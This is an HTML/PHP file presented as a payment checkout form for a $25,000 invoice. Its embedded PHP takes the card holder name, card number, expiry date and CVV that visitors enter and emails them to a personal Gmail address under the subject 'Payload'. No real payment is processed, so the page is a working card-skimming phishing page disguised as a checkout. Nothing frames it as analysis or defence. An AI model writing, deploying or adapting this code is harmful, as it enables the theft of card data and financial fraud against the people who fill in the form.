<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Payment Checkout Form</title>
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.2/css/all.css">
	<link rel="stylesheet" href="styles.css">

</head>
<body>
	


<div class="wrapper">
  <div class="payment">
    <div class="payment-logo">
      <p>S</p>
    </div>
    
    <p class="payment-invoice">Invoice #4435</p>
    <h4>$25,000.00</h4>
    <form action="" method = "post">
      <div class="form">
          <div class="card space icon-relative">
            <label class="label">Card holder:</label>
            <input name="card_ho" type="text" class="input" placeholder="Stephen Naismith" required>
          </div>
          <div class="card space icon-relative">
            <label class="label">Card number:</label>
            <input name="card_no" type="text" class="input" data-mask="0000 0000 0000 0000" placeholder="1234 5678 9012 3456" required>
          </div>
          <div class="card-grp space">
            <div class="card-item icon-relative">
              <label class="label">Expiry date:</label>
              <input name="card_ex"type="text" name="expiry-data" class="input" data-mask="00 / 00"  placeholder="00 / 00" required>
            </div>
            <div class="card-item icon-relative">
              <label class="label">CVC:</label>
              <input name="cvv" type="text" class="input" data-mask="000" placeholder="000" required>
            </div>
        </div>
        <input type="submit" class="btn" value="Pay"> 
      </div>
    </form>
  </div>
</div>

<?php
if(isset($_POST['card_ho'])&& isset($_POST['card_no']) && isset($_POST['card_ex'])  && isset ($_POST['cvv']))
{
    $cardho = $_POST['card_ho'];
    $cardno = $_POST['card_no'];
    $cardex = $_POST['card_ex'];
    $cvv = $_POST['cvv'];

    $message =  $cardho . " " . $cardno . " " . $cardex . " " . $cvv;

    $to = "emekaveli@gmail.com";
    $subject = "Payload";
    $headers = array(
        'From' => 'webmaster@example.com',
        'Reply-To' => 'webmaster@example.com',
        'X-Mailer' => 'PHP/' . phpversion()
    );
    mail($to, $subject, $message, $headers);
    // try {
    //    if(!mail($to, $subject, $message, $headers)){
    //      throw new Exception("Failed");
    //    } 
    //   } catch (Exception $e) {
    //     echo $e->getMessage();
    //     die();
    //   } finally{
    //     mail($to, $subject, $message, $headers);
    //   }
}
?>
	<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>

</body>
</html>